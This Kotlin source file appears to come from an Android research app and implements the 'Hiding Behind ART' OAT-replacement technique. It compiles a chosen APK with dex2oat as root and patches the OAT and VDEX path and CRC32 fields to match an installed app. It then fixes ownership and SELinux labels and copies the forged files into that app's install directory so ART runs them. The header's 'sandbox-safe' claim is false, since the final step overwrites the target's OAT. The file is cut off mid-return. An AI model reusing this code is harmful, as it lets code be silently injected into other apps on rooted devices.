package spook.horror.security

import android.content.Context
import android.net.Uri
import android.util.Log
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.RandomAccessFile
import java.util.zip.CRC32
import java.util.zip.ZipFile

/**
 * Dex2OatRunner — end-to-end lab pipeline that reproduces installd's OAT output
 * shape, plus the Sabanal "Hiding Behind ART" (BlackHat Asia 2015, pp. 15 & 17)
 * path-padding and CRC32 patching.
 *
 * Command shape mirrors what installd emits (only ISA differs by device):
 *
 *   dex2oat
 *     --dex-file=/data/tmp/<pad>/base.apk
 *     --oat-file=<filesDir>/base.odex
 *     --class-loader-context=PCL[]{PCL[/system/framework/android.test.base.jar]}
 *     --instruction-set=<arm64|x86_64|...>
 *
 * Notes on why each of these matters:
 *   - working APK path lives in /data/tmp/, and PADDING GOES IN THE DIRECTORY NAME
 *     ("1" prefix), not in the filename, e.g. /data/tmp/1111...111/base.apk.
 *   - --dex-file points to the APK itself (dex2oat parses classes.dex out of the zip).
 *   - --class-loader-context is the post-API-28 shared-libraries form, with an
 *     android.test.base entry that many apps declare as a <uses-library>.
 *   - --oat-file goes into THIS app's own filesDir, named base.odex (dex2oat
 *     also emits base.vdex alongside).
 *   - After dex2oat, byte-patch the OAT's dex_file_location_data back to the
 *     target install path, and the following 4-byte dex_file_location_checksum
 *     back to the original classes.dex CRC32 (PDF pp. 8-9). This is the whole
 *     point of the "1..1" padding: same length → no offsets shift.
 *   - Permission fixups: chmod 644 + chown 1000:1000 on the odex/vdex
 *     (uid 1000 = "system"), so ART treats the OAT like installd-produced output.
 *   - Log messages `try create oat with dex2oat:` and `oat created with dex2oat -
 *     length=<N>` are emitted via android.util.Log/System.out for step tracing.
 *
 * Sandbox-safe: dex2oat only ever writes into THIS app's own filesDir and into
 * /data/tmp/ (a scratch dir we clean up). The "target install path" is used purely
 * as a STRING patched into the OAT header; nothing is installed, no other app's
 * OAT/dex is touched.
 */
object Dex2OatRunner {

    private const val TAG = "dex2oat-lab"

    /**
     * Verbose step-by-step logging toggle (controlled from the UI menu).
     * When false, the pipeline's INFO narration is suppressed; errors (Log.e) always print.
     */
    @Volatile
    @JvmField
    var verbose: Boolean = true

    /** Gated INFO logger — same signature as vlog(TAG, msg) so calls swap 1:1. */
    private fun vlog(tag: String, msg: String) {
        if (verbose)
            Log.i(tag, msg)
    }

    // Scratch dir, apk name, and out oat name — matching installd's naming.
    private const val WORK_ROOT = "/data/tmp"
    private const val WORK_APK_NAME = "base.apk"
    private const val OAT_FILE_NAME = "base.odex"
    private const val VDEX_FILE_NAME = "base.vdex"

    // Fallback CLC when neither the installed OAT nor PackageManager give us one.
    private const val FALLBACK_CLC = "PCL[]"

    data class RunResult(
        val sourceApkPath: String,
        val rootAvailable: Boolean,
        val command: List<String>,
        val exitCode: Int,
        val stdout: String,
        val stderr: String,
        val outDexPath: String,          // /data/tmp/<pad>/base.apk
        val outOatPath: String,          // <filesDir>/oat/<isa>/base.odex
        val outOatExists: Boolean,
        val outOatSizeBytes: Long,
        val instructionSet: String,
        val classLoaderContext: String?,
        val classLoaderContextSource: String,
        val detail: String,
        val originalDexCrc32: Long,
        val installedDexCrcs: Map<String, Long>,
        val targetInstallPath: String,
        val workingDexPath: String,
        val pathsLengthMatch: Boolean,
        val patchCount: Int,
        val patchApplied: Boolean,
        val patchDetail: String,
        val patchPerDex: List<String>,
        val vdexPatchCount: Int,
        val vdexPatchApplied: Boolean,
        val vdexPatchDetail: String,
        val vdexPatchPerDex: List<String>,
        val permissionsApplied: Boolean,
        val permissionsDetail: String,
        // Final "move" step — copy odex+vdex to the target app's install-dir oat/<isa>/ folder.
        val moveAttempted: Boolean,
        val moveApplied: Boolean,
        val movedOdexPath: String,
        val movedVdexPath: String,
        val moveDetail: String,
    )

    /**
     * Pipeline against a user-picked APK. Resolves the APK's package name and looks
     * up the corresponding installed app's sourceDir, so the produced OAT can be
     * moved into the RIGHT install dir — via package-name → install-path
     * resolution through PackageManager.
     */
    fun runOnApkUri(context: Context, apkUri: Uri): RunResult {
        logSection("Pipeline start — user picked an APK")
        vlog(TAG, "  picked URI: $apkUri")

        val stageDir = File(context.filesDir, "dex2oat-lab").apply { mkdirs() }
        val stagedApk = File(stageDir, "picked.apk")

        val copyOk = try {
            context.contentResolver.openInputStream(apkUri)?.use { input ->
                stagedApk.outputStream().use { output -> input.copyTo(output) }
            }
            stagedApk.exists() && stagedApk.length() > 0
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString())
            false
        }
        if (!copyOk) {
            Log.e(TAG, "FAIL: could not stage the picked APK from the file picker")
            return errored(apkUri.toString(), "could not copy picked APK from picker")
        }
        vlog(TAG, "  staged apk: ${stagedApk.absolutePath} (${stagedApk.length()} bytes)")

        // Resolve the picked APK's package name → the currently-installed version's
        // sourceDir. This is the whole point of the pipeline: without a real installed
        // target we have nowhere to move the produced OAT to.
        val pkgName = queryApkPackageName(context, stagedApk)
        if (pkgName == null) {
            Log.e(TAG, "FAIL: could not parse package name from picked APK")
            return errored(apkUri.toString(), "could not parse package name from picked APK — is it a valid APK?")
        }
        vlog(TAG, "  parsed package name: $pkgName")

        val installedInfo = resolveInstalledApplicationInfo(context, pkgName)
        if (installedInfo == null) {
            Log.e(TAG, "FAIL: package '$pkgName' is not installed on this device")
            return errored(
                apkUri.toString(),
                "package '$pkgName' is not installed on this device — install it first, then re-run. " +
                    "(We need the target's install-dir to know where to put the OAT.)"
            )
        }
        vlog(TAG, "  installed target found:")
        vlog(TAG, "    sourceDir = ${installedInfo.sourceDir}")
        vlog(TAG, "    uid       = ${installedInfo.uid} (== gid for third-party apps)")
        vlog(TAG, "    sharedLibs= ${installedInfo.sharedLibraryFiles.size} entries: ${installedInfo.sharedLibraryFiles}")

        return runOnApkFile(
            context, stagedApk,
            label = "$pkgName (uid=${installedInfo.uid})",
            targetInstallPath = installedInfo.sourceDir,
            targetInstallDir = File(installedInfo.sourceDir).parentFile?.absolutePath,
            targetUid = installedInfo.uid,
            sharedLibraryFiles = installedInfo.sharedLibraryFiles,
        )
    }

    private fun logSection(title: String) {
        vlog(TAG, "═══════════════════════════════════════════════════════════")
        vlog(TAG, "  $title")
        vlog(TAG, "═══════════════════════════════════════════════════════════")
    }

    private fun logStep(n: Int, title: String) {
        vlog(TAG, "")
        vlog(TAG, "──── STEP $n: $title ────")
    }

    private fun queryApkPackageName(context: Context, apkFile: File): String? = try {
        context.packageManager.getPackageArchiveInfo(apkFile.absolutePath, 0)?.packageName
    } catch (t: Throwable) {
        vlog(TAG, t.message.toString())
        null
    }

    private data class InstalledInfo(val sourceDir: String, val uid: Int, val sharedLibraryFiles: List<String>)

    /**
     * Returns installed app's sourceDir, uid (== gid for third-party apps), and its
     * resolved shared-library JAR paths (populated when the manifest declares
     * <uses-library> entries and those libraries are installed on the system).
     */
    private fun resolveInstalledApplicationInfo(context: Context, packageName: String): InstalledInfo? = try {
        val flags = android.content.pm.PackageManager.GET_SHARED_LIBRARY_FILES
        val ai = context.packageManager.getApplicationInfo(packageName, flags)
        InstalledInfo(
            sourceDir = ai.sourceDir,
            uid = ai.uid,
            sharedLibraryFiles = ai.sharedLibraryFiles?.toList() ?: emptyList(),
        )
    } catch (t: Throwable) {
        vlog(TAG, t.message.toString())
        null
    }

    /**
     * Class-loader-context resolution strategy:
     *
     *   1. Preferred — read the exact CLC string from the currently-installed OAT's
     *      key_value_store. That's what installd used when it compiled the OAT, so
     *      it's guaranteed correct for the target app.
     *   2. Fallback — build a CLC from PackageManager's resolved sharedLibraryFiles,
     *      matching the `PCL[]{PCL[/system/framework/lib.jar]#PCL[...]}` syntax.
     *   3. Last resort — bare `PCL[]`.
     */
    private fun resolveClassLoaderContext(
        installedSourceDir: String,
        isa: String,
        sharedLibraryFiles: List<String>,
    ): Pair<String, String> {
        // Attempt 1: read from the installed OAT.
        val installedOatPath = "${File(installedSourceDir).parent}/oat/$isa/base.odex"
        vlog(TAG, "  [CLC] tier 1: looking in installed OAT at $installedOatPath")
        val fromInstalledOat = readClcFromOat(File(installedOatPath))
        if (!fromInstalledOat.isNullOrBlank()) {
            vlog(TAG, "  [CLC] tier 1 hit: $fromInstalledOat")
            return fromInstalledOat to "read from installed OAT ($installedOatPath) key_value_store"
        }
        vlog(TAG, "  [CLC] tier 1 miss (installed OAT missing or CLC not found)")
        // Attempt 2: construct from PackageManager's shared library list.
        if (sharedLibraryFiles.isNotEmpty()) {
            val libsStr = sharedLibraryFiles.joinToString("#") { "PCL[$it]" }
            val clc = "PCL[]{$libsStr}"
            vlog(TAG, "  [CLC] tier 2 hit: $clc")
            return clc to "constructed from PackageManager.sharedLibraryFiles (${sharedLibraryFiles.size} libs)"
        }
        // Attempt 3: bare PCL[].
        vlog(TAG, "  [CLC] tier 3 fallback: $FALLBACK_CLC (no shared libs)")
        return FALLBACK_CLC to "no shared libraries declared, using fallback"
    }

    /**
     * Extracts the `--class-loader-context` value from an OAT's key_value_store.
     *
     * dex2oat stores its full command line as one big string inside the OAT's
     * key_value_store (part of OatHeader, see AOSP art/runtime/oat.h). Args inside
     * that string are SPACE-separated, so a flag's value ends at the next space
     * character. We search for `--class-loader-context=` (with `=`), then read
     * until byte 0x20.
     *
     * key_value_store lives near the top of oatdata; scanning the first ~32 KB is
     * more than enough on every real OAT.
     */
    private fun readClcFromOat(oatFile: File): String? {
        if (!oatFile.exists() || oatFile.length() < 4096) return null
        return try {
            val readSize = minOf(32 * 1024L, oatFile.length()).toInt()
            val bytes = ByteArray(readSize)
            java.io.RandomAccessFile(oatFile, "r").use { raf -> raf.readFully(bytes) }
            val keyBytes = "--class-loader-context=".toByteArray(Charsets.US_ASCII)
            val idx = indexOfBytes(bytes, keyBytes)
            if (idx < 0) return null
            val valStart = idx + keyBytes.size
            var end = valStart
            // Value ends at next space (arg terminator) or null (safety).
            while (end < bytes.size && bytes[end] != 0x20.toByte() && bytes[end] != 0.toByte()) end++
            if (end == valStart) return null
            String(bytes, valStart, end - valStart, Charsets.US_ASCII)
        } catch (t: Throwable) {
            vlog(TAG, t.message.toString())
            null
        }
    }

    private fun runOnApkFile(
        context: Context,
        apkFile: File,
        label: String,
        targetInstallPath: String,
        targetInstallDir: String?,
        targetUid: Int,
        sharedLibraryFiles: List<String>,
    ): RunResult {
        val isa = currentInstructionSet()
        vlog(TAG, "  detected ISA: $isa")

        logStep(1, "Read CRC32s from picked APK and installed target APK")
        vlog(TAG, "  Why: for each classesN.dex, ART cross-checks:")
        vlog(TAG, "         installed_apk.dexN.CRC32 == OAT.header[N].crc == VDEX.crcs[N]")
        vlog(TAG, "       We need the installed CRCs to know what to WRITE into OAT/VDEX,")
        vlog(TAG, "       and the picked CRCs to know what to SEARCH FOR in the VDEX.")

        // Step 1 — CRC32 of the SOURCE APK's classes.dex + CRCs of every classesN.dex
        // in the INSTALLED target APK (the values ART enforces at load time,
        // PDF pp. 8-9). For a multi-dex APK, each classesN.dex has its own
        // OatDexFileHeader entry with its own dex_file_location_checksum — every
        // one must be patched; missing any one causes ART to reject the OAT.
        val originalCrc32 = computeDexCrc32(apkFile)
        if (originalCrc32 < 0) return errored(
            label,
            "picked APK has no classes.dex — is it a split APK (split_config.*.apk) or a bundle (.aab/.xapk)?" +
                " Pick the BASE APK that contains classes.dex."
        )
        val pickedApkCrcs = computeAllDexCrcs(apkFile)
        if (pickedApkCrcs.isEmpty()) return errored(
            label,
            "picked APK has no classes*.dex entries — it looks like a split APK or resource-only APK." +
                " Pick the base APK (usually the largest one, or the one literally named base.apk)."
        )
        val installedApkCrcs = computeAllDexCrcs(File(targetInstallPath))
        if (installedApkCrcs.isEmpty()) return errored(label, "could not read classes*.dex CRCs from installed APK at $targetInstallPath")
        vlog(TAG, "  picked APK classesN.dex CRCs (${pickedApkCrcs.size} entries):")
        pickedApkCrcs.forEach { (name, crc) -> vlog(TAG, "    $name = 0x%08x".format(crc)) }
        vlog(TAG, "  installed APK classesN.dex CRCs (${installedApkCrcs.size} entries):")
        installedApkCrcs.forEach { (name, crc) -> vlog(TAG, "    $name = 0x%08x".format(crc)) }

        logStep(2, "Resolve Class-Loader-Context (CLC)")
        vlog(TAG, "  Why: on API 28+, ART checks that the OAT was compiled with the")
        vlog(TAG, "       same CLC as the app's current class loader hierarchy uses.")
        vlog(TAG, "       Wrong CLC → ART rejects the OAT.")
        vlog(TAG, "  Strategy:")
        vlog(TAG, "    tier 1: read from installed OAT's key_value_store")
        vlog(TAG, "    tier 2: build from PackageManager.sharedLibraryFiles")
        vlog(TAG, "    tier 3: bare PCL[]")

        // Step 1b — resolve the class-loader-context that the target app's installed
        // OAT was compiled with, by reading the exact CLC string from the installed
        // OAT's key_value_store, with two fallbacks (PackageManager shared libraries,
        // then bare PCL[]).
        val (clc, clcSource) = resolveClassLoaderContext(targetInstallPath, isa, sharedLibraryFiles)
        vlog(TAG, "  resolved CLC: $clc")
        vlog(TAG, "  source: $clcSource")

        logStep(3, "Sabanal path padding — compute working path")
        vlog(TAG, "  Why: we compile to a working path, then byte-patch the OAT to")
        vlog(TAG, "       swap the working path with the target install path. If they're")
        vlog(TAG, "       the same length, nothing shifts — no offsets need updating.")
        vlog(TAG, "  target install path: $targetInstallPath")
        vlog(TAG, "  target length: ${targetInstallPath.length}")

        // Step 2 — pad WORKING PATH to same length as target install path. We pad the
        // DIRECTORY name (not filename): /data/tmp/<N x '1'>/base.apk.
        val fixedPrefix = "$WORK_ROOT/"                   // "/data/tmp/"
        val fixedSuffix = "/$WORK_APK_NAME"               // "/base.apk"
        val overhead = fixedPrefix.length + fixedSuffix.length
        if (targetInstallPath.length < overhead + 1) {
            return errored(
                label,
                "target install path (${targetInstallPath.length}) shorter than min working path (${overhead + 1}) " +
                    "under $WORK_ROOT/ — cannot pad."
            )
        }
        val padCount = targetInstallPath.length - overhead
        val paddedDir = "1".repeat(padCount)
        val workingApkPath = "$fixedPrefix$paddedDir$fixedSuffix"
        vlog(TAG, "  fixed overhead: '$fixedPrefix' + '$fixedSuffix' = $overhead chars")
        vlog(TAG, "  pad count: $padCount ('1' × $padCount)")
        vlog(TAG, "  working apk path: $workingApkPath")
        vlog(TAG, "  working length: ${workingApkPath.length} (must equal target ${targetInstallPath.length})")
        vlog(TAG, "  lengths match: ${workingApkPath.length == targetInstallPath.length}")

        // Standard ART layout: <install-dir>/oat/<isa>/base.odex. We mirror this in our
        // sandbox so the output looks like what installd would have produced — matches
        // where ART expects to find OAT files.
        val outOatDir = "${context.filesDir.absolutePath}/oat/$isa"
        val outOatPath = "$outOatDir/$OAT_FILE_NAME"
        val outVdexPath = "$outOatDir/$VDEX_FILE_NAME"
        vlog(TAG, "  OAT will be produced at: $outOatPath")
        vlog(TAG, "  VDEX will be produced at: $outVdexPath")

        if (!hasRoot()) {
            return RunResult(
                sourceApkPath = label,
                rootAvailable = false, command = emptyList(), exitCode = -1,
                stdout = "", stderr = "",
                outDexPath = workingApkPath, outOatPath = outOatPath,
                outOatExists = false, outOatSizeBytes = 0, instructionSet = isa,
                classLoaderContext = clc,
                classLoaderContextSource = clcSource,
                detail = "no su binary found — run on a rooted emulator/device to exercise dex2oat directly",
                originalDexCrc32 = originalCrc32,
                targetInstallPath = targetInstallPath,
                workingDexPath = workingApkPath,
                pathsLengthMatch = workingApkPath.length == targetInstallPath.length,
                installedDexCrcs = installedApkCrcs,
                patchCount = 0, patchApplied = false, patchDetail = "root required",
                patchPerDex = emptyList(),
                vdexPatchCount = 0, vdexPatchApplied = false, vdexPatchDetail = "root required",
                vdexPatchPerDex = emptyList(),
                permissionsApplied = false, permissionsDetail = "root required",
                moveAttempted = false, moveApplied = false,
                movedOdexPath = "", movedVdexPath = "",
                moveDetail = "root required",
            )
        }

        logStep(4, "Prepare scratch dirs")
        vlog(TAG, "  Why: dex2oat needs a fresh output dir. Any stale .odex/.vdex/.art")
        vlog(TAG, "       could confuse the compile, so we wipe them first.")

        // Ensure standard ART oat/<isa>/ output layout exists — dex2oat won't create
        // missing parent dirs. Create as our uid (Kotlin File) first, then chmod as
        // root so root-owned dex2oat can also write there.
        File(outOatDir).mkdirs()
        runAsRoot(listOf("mkdir", "-p", outOatDir))
        runAsRoot(listOf("chmod", "777", outOatDir))
        vlog(TAG, "  created output dir: $outOatDir (mode 777, for root-run dex2oat)")

        // Clean stale outputs: delete .odex/.vdex/.art before recompile.
        runAsRoot(listOf("rm", "-f", outOatPath))
        runAsRoot(listOf("rm", "-f", outVdexPath))
        runAsRoot(listOf("rm", "-f", "$outOatDir/base.art"))
        // Also wipe any old padded working dirs from previous runs.
        runAsRoot(listOf("sh", "-c", "rm -rf $WORK_ROOT/1* 2>/dev/null"))
        vlog(TAG, "  cleaned stale outputs and any prior /data/tmp/1* padded dirs")

        // Create the padded working dir under /data/tmp and copy source APK into it.
        runAsRoot(listOf("mkdir", "-p", "$fixedPrefix$paddedDir"))
        runAsRoot(listOf("chmod", "777", "$fixedPrefix$paddedDir"))
        val (cpExit, _, cpErr) = runAsRoot(listOf("cp", apkFile.absolutePath, workingApkPath))
        if (cpExit != 0) {
            Log.e(TAG, "FAIL: cp to $workingApkPath — ${cpErr.trim()}")
            return errored(label, "cp to $workingApkPath failed: ${cpErr.trim()}")
        }
        runAsRoot(listOf("chmod", "644", workingApkPath))
        vlog(TAG, "  copied picked apk → $workingApkPath (${File("$fixedPrefix$paddedDir/base.apk").let { if (it.exists()) it.length() else -1 }} bytes)")

        logStep(5, "Run dex2oat")
        vlog(TAG, "  Why: this is the core compilation step — dex2oat translates each")
        vlog(TAG, "       classesN.dex to native machine code and emits base.odex/base.vdex.")
        vlog(TAG, "  Typical duration: 5-15 seconds for a mid-size APK.")

        // Step 3 — invoke dex2oat with the installd-equivalent command shape.
        vlog(TAG, "try create oat with dex2oat:")
        if (verbose) println("try create oat with dex2oat:")
        val command = buildDex2OatCommand(workingApkPath, outOatPath, isa, clc)
        vlog(TAG, "  command:")
        command.forEach { vlog(TAG, "    $it") }
        val (exit, out, err) = runAsRoot(command)

        val oatFile = File(outOatPath)
        val oatExists = oatFile.exists()
        val oatSize = if (oatExists) oatFile.length() else 0L
        vlog(TAG, "  dex2oat exit code: $exit")
        vlog(TAG, "  OAT exists: $oatExists, size: $oatSize bytes")
        if (err.isNotBlank()) vlog(TAG, "  dex2oat stderr: ${err.trim().take(500)}")
        if (oatExists && oatSize > 0) {
            vlog(TAG, "oat created with dex2oat - length=$oatSize")
            if (verbose) println("oat created with dex2oat - length=$oatSize")
        } else {
            Log.e(TAG, "FAIL: dex2oat did not produce an OAT — check stderr above")
        }

        logStep(6, "OAT byte-patch (multi-dex)")
        vlog(TAG, "  Why: the OAT header stores per-DEX 'location' (path) + 'checksum'")
        vlog(TAG, "       (CRC32). Right now they say 'compiled from padded /data/tmp path.'")
        vlog(TAG, "       We rewrite them to say 'compiled from the installed APK's path")
        vlog(TAG, "       with the installed classesN.dex CRC32,' so ART trusts the OAT.")
        vlog(TAG, "  Detection: for each occurrence of the padded path in the OAT bytes,")
        vlog(TAG, "             read the uint32 size prefix 4 bytes before the match.")
        vlog(TAG, "             size == workingPath.length      → main classes.dex entry")
        vlog(TAG, "             size == workingPath.length + N  → check for !classesN.dex")
        vlog(TAG, "             other                            → false positive, skip")

        // Step 4 — multi-dex-aware OAT byte-patch. Every classesN.dex has its own
        // OatDexFileHeader; each gets its dex_file_location_data (padded → target)
        // and dex_file_location_checksum (→ installed target's classesN.dex CRC32)
        // rewritten. Missing any one causes ART to reject the whole OAT.
        var patchCount = 0
        var patchApplied = false
        var patchDetail = "not attempted"
        var patchPerDex: List<String> = emptyList()
        if (oatExists && oatSize > 0) {
            // dex2oat runs as root; make OAT writable by our uid so we can rewrite bytes.
            runAsRoot(listOf("chmod", "666", outOatPath))
            vlog(TAG, "  chmod 666 on OAT so we can write to it from our uid")
            val res = patchOatMultiDex(oatFile, workingApkPath, targetInstallPath, pickedApkCrcs, installedApkCrcs)
            patchCount = res.patchCount
            patchApplied = res.applied
            patchDetail = res.detail
            patchPerDex = res.perDexDetails
            vlog(TAG, "  OAT patch result: applied=$patchApplied, count=$patchCount")
            patchPerDex.forEach { vlog(TAG, "    - $it") }
            if (patchCount != installedApkCrcs.size) {
                Log.w(TAG, "  ⚠ patched $patchCount of ${installedApkCrcs.size} expected — ART will REJECT this OAT")
            }
        } else {
            patchDetail = "OAT not present — nothing to patch"
            Log.w(TAG, "  skipped: no OAT to patch")
        }

        logStep(7, "VDEX byte-patch (dex_checksums array)")
        vlog(TAG, "  Why: VDEX has its own dex_checksums array. ART checks that")
        vlog(TAG, "       VDEX.crcs[N] == OAT.header[N].crc. If they disagree, ART")
        vlog(TAG, "       rejects both. This is what installd sets up naturally at")
        vlog(TAG, "       install time — we have to REPRODUCE that consistency.")
        vlog(TAG, "  Approach: search for the picked APK's 24-byte CRC sequence in")
        vlog(TAG, "            the VDEX (dex2oat just wrote them there), overwrite")
        vlog(TAG, "            with the installed APK's CRC sequence. Version-agnostic.")

        // Step 4b — VDEX header carries its own dex_checksums array; ART cross-checks
        // this against the OAT's CRCs. Without patching this, ART rejects the OAT
        // even when everything else is correct.
        var vdexPatchCount = 0
        var vdexPatchApplied = false
        var vdexPatchDetail = "not attempted"
        var vdexPatchPerDex: List<String> = emptyList()
        val vdexFile = File(outVdexPath)
        if (vdexFile.exists() && vdexFile.length() > 0) {
            runAsRoot(listOf("chmod", "666", outVdexPath))
            vlog(TAG, "  chmod 666 on VDEX so we can write to it")
            val res = patchVdexChecksums(vdexFile, pickedApkCrcs, installedApkCrcs)
            vdexPatchCount = res.patchCount
            vdexPatchApplied = res.applied
            vdexPatchDetail = res.detail
            vdexPatchPerDex = res.perDexDetails
            vlog(TAG, "  VDEX patch result: applied=$vdexPatchApplied, count=$vdexPatchCount, detail=$vdexPatchDetail")
            vdexPatchPerDex.forEach { vlog(TAG, "    - $it") }
        } else {
            vdexPatchDetail = "VDEX not present — nothing to patch"
            Log.w(TAG, "  skipped: no VDEX to patch")
        }

        logStep(8, "Permission fixups on the produced OAT/VDEX")
        vlog(TAG, "  Why: right now files are owned by root (dex2oat ran as root).")
        vlog(TAG, "       Target app can't read root-owned files without world-read.")
        vlog(TAG, "       Set owner=system(1000), group=<app_uid>, mode=644 — matches")
        vlog(TAG, "       what installd would produce. Base.apk uses BOTH colon (:)")
        vlog(TAG, "       and dot (.) chown syntax to cover Toybox and BusyBox variants.")

        // Step 5 — permission fixups: chmod 644 + chown to system:<target-app-gid>.
        // Android sets gid == uid for third-party apps, so the group is the target
        // app's own uid — matching installd's `system u0_aNNN` ownership.
        // We do BOTH `chown 1000:<gid>` and `chown 1000.<gid>` — colon form is
        // Toybox/Coreutils, dot form is BusyBox.
        var permsApplied = false
        var permsDetail = "not attempted"
        if (oatExists) {
            val (odexChmodExit, _, odexChmodErr) = runAsRoot(listOf("chmod", "644", outOatPath))
            val (odexChownExit, _, odexChownErr) = runAsRoot(listOf("chown", "1000:$targetUid", outOatPath))
            runAsRoot(listOf("chown", "1000.$targetUid", outOatPath))
            val vdexNote = if (File(outVdexPath).exists()) {
                runAsRoot(listOf("chmod", "644", outVdexPath))
                runAsRoot(listOf("chown", "1000:$targetUid", outVdexPath))
                runAsRoot(listOf("chown", "1000.$targetUid", outVdexPath))
                " + vdex"
            } else ""
            permsApplied = odexChmodExit == 0 && odexChownExit == 0
            permsDetail = if (permsApplied)
                "chmod 644 + chown 1000:$targetUid applied to odex$vdexNote"
            else
                "chmod=$odexChmodExit chown=$odexChownExit stderr=${(odexChmodErr + odexChownErr).trim()}"
            vlog(TAG, "  perms result: $permsDetail")
        } else {
            permsDetail = "OAT not present — nothing to chmod/chown"
            Log.w(TAG, "  skipped: no OAT to fix perms on")
        }

        logStep(9, "Move to target app's install-dir oat/<isa>/")
        vlog(TAG, "  Why: this is the final step — put the patched OAT where ART")
        vlog(TAG, "       expects it: $targetInstallDir/oat/$isa/base.odex")
        vlog(TAG, "  Guard: we ONLY move if all prior steps succeeded. Refusing to")
        vlog(TAG, "         drop a broken OAT that would crash the target on launch.")
        vlog(TAG, "  Critical final touch: restorecon -R to set the SELinux labels")
        vlog(TAG, "                        that ART requires (dalvikcache_data_file).")

        // Step 7 — copy odex+vdex to the target app's install-dir oat/<isa>/ folder.
        // This is the ACTUAL "replace the OAT" step. Only attempted when
        // we have a real install dir (not a synthesized one), and only when patch+perms
        // both succeeded, so we don't leave the target app with a broken OAT.
        var moveAttempted = false
        var moveApplied = false
        var movedOdexPath = ""
        var movedVdexPath = ""
        var moveDetail = "not attempted — no real install dir resolved for the target APK"
        if (targetInstallDir != null && oatExists && oatSize > 0 && patchApplied && vdexPatchApplied && permsApplied) {
            moveAttempted = true
            val installOatDir = "$targetInstallDir/oat/$isa"
            val destOdex = "$installOatDir/$OAT_FILE_NAME"
            val destVdex = "$installOatDir/$VDEX_FILE_NAME"
            movedOdexPath = destOdex
            movedVdexPath = destVdex
            vlog(TAG, "  destination oat dir: $installOatDir")

            val oatParentDir = "$targetInstallDir/oat"
            val (mkExit, _, mkErr) = runAsRoot(listOf("mkdir", "-p", installOatDir))
            if (mkExit != 0) {
                moveDetail = "mkdir $installOatDir failed: ${mkErr.trim()}"
                Log.e(TAG, "FAIL: $moveDetail")
            } else {
                vlog(TAG, "  mkdir -p succeeded")
                // Copy odex
                val (cpOdexExit, _, cpOdexErr) = runAsRoot(listOf("cp", "-f", outOatPath, destOdex))
                val vdexExists = File(outVdexPath).exists()
                val (cpVdexExit, _, cpVdexErr) = if (vdexExists)
                    runAsRoot(listOf("cp", "-f", outVdexPath, destVdex))
                else Triple(0, "", "")
                vlog(TAG, "  cp odex: exit=$cpOdexExit ${if (cpOdexExit != 0) "err=${cpOdexErr.trim()}" else "OK"}")
                if (vdexExists) vlog(TAG, "  cp vdex: exit=$cpVdexExit ${if (cpVdexExit != 0) "err=${cpVdexErr.trim()}" else "OK"}")

                if (cpOdexExit == 0 && cpVdexExit == 0) {
                    // Matches installd's install-dir OAT layout exactly:
                    //   oat/           system:<targetUid>  drwxr-xr-x
                    //   oat/<isa>/     system:<targetUid>  drwxr-xr-x
                    //   base.odex      system:<targetUid>  -rw-r--r--
                    //   base.vdex      system:<targetUid>  -rw-r--r--
                    runAsRoot(listOf("chmod", "755", oatParentDir))
                    runAsRoot(listOf("chown", "1000:$targetUid", oatParentDir))
                    runAsRoot(listOf("chown", "1000.$targetUid", oatParentDir))

                    runAsRoot(listOf("chmod", "755", installOatDir))
                    runAsRoot(listOf("chown", "1000:$targetUid", installOatDir))
                    runAsRoot(listOf("chown", "1000.$targetUid", installOatDir))

                    runAsRoot(listOf("chmod", "644", destOdex))
                    runAsRoot(listOf("chown", "1000:$targetUid", destOdex))
                    runAsRoot(listOf("chown", "1000.$targetUid", destOdex))
                    if (vdexExists) {
                        runAsRoot(listOf("chmod", "644", destVdex))
                        runAsRoot(listOf("chown", "1000:$targetUid", destVdex))
                        runAsRoot(listOf("chown", "1000.$targetUid", destVdex))
                    }
                    // SELinux label — restorecon so ART accepts the file. Must be
                    // applied AFTER chown; recursion covers oat/ and oat/<isa>/.
                    runAsRoot(listOf("restorecon", "-R", oatParentDir))
                    vlog(TAG, "  applied chmod/chown to oat/, oat/$isa, base.odex, base.vdex")
                    vlog(TAG, "  applied restorecon -R on $oatParentDir")

                    moveApplied = true
                    moveDetail = "copied to $installOatDir; oat/ + oat/$isa + files chown'd to 1000:$targetUid (system:app-gid), restorecon -R applied"
                    vlog(TAG, "  ✓ MOVE SUCCEEDED")
                } else {
                    moveDetail = "cp odex=$cpOdexExit vdex=$cpVdexExit stderr=${(cpOdexErr + cpVdexErr).trim()}"
                    Log.e(TAG, "FAIL: $moveDetail")
                }
            }
        } else if (targetInstallDir != null) {
            moveDetail = "skipped — earlier step failed (patch/perms/OAT). Refusing to move a broken OAT into the target's install dir."
            Log.w(TAG, "  skipped move: an earlier step failed. Not risking a broken OAT in the target's install dir.")
        }

        // Clean working dir (leave OAT/vdex behind in filesDir for inspection).
        runAsRoot(listOf("rm", "-rf", "$fixedPrefix$paddedDir"))
        vlog(TAG, "  cleaned /data/tmp/<pad>/ working dir")

        logSection("Pipeline complete")
        vlog(TAG, "  Summary:")
        vlog(TAG, "    dex2oat exit          : $exit")
        vlog(TAG, "    OAT produced          : $oatExists ($oatSize bytes)")
        vlog(TAG, "    OAT entries patched   : $patchCount of ${installedApkCrcs.size} expected")
        vlog(TAG, "    VDEX entries patched  : $vdexPatchCount of ${installedApkCrcs.size} expected")
        vlog(TAG, "    Permissions applied   : $permsApplied")
        vlog(TAG, "    Moved to install dir  : $moveApplied")
        if (moveApplied) {
            vlog(TAG, "  → Next step: force-stop the target app and relaunch it.")
            vlog(TAG, "    ART will load your patched OAT.")
        }

        return RunResult(
            sourceApkPath = label,
            rootAvailable = true,
            command = command,
            exitCode = exit,
            stdout = out,
            stderr = err,
            outDexPath = workingApkPath,
            outOatPath = outOatPath,
            outOatExists = oatExists,
            outOatSizeBytes = oatSize,
            instructionSet = isa,
            classLoaderContext = clc,
            classLoaderContextSource = clcSource,
            detail = if (oatExists && oatSize > 0)
                "dex2oat produced a real OAT ($oatSize bytes)"
            else
                "dex2oat did not produce output — check stderr",
            originalDexCrc32 = originalCrc32,
            targetInstallPath = targetInstallPath,
            workingDexPath = workingApkPath,
            pathsLengthMatch = workingApkPath.length == targetInstallPath.length,
            installedDexCrcs = installedApkCrcs,
            patchCount = patchCount,
            patchApplied = patchApplied,
            patchDetail = patchDetail,
            patchPerDex = patchPerDex,
            vdexPatchCount = vdexPatchCount,
            vdexPatchApplied = vdexPatchApplied,
            vdexPatchDetail = vdexPatchDetail,
            vdexPatchPerDex = vdexPatchPerDex,
            permissionsApplied = permsApplied,
            permissionsDetail = permsDetail,
